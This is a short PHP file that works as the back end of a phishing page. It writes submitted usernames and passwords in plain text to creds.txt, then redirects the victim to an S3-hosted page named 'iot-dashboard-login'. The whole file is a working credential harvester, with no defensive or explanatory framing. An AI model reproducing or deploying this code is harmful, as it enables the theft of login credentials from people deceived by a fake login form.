<?php
file_put_contents("creds.txt",
    "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\\n",
    FILE_APPEND
);
header("Location: http://iot-dashboard-login.s3-website.eu-north-1.amazonaws.com/");
exit();
?>

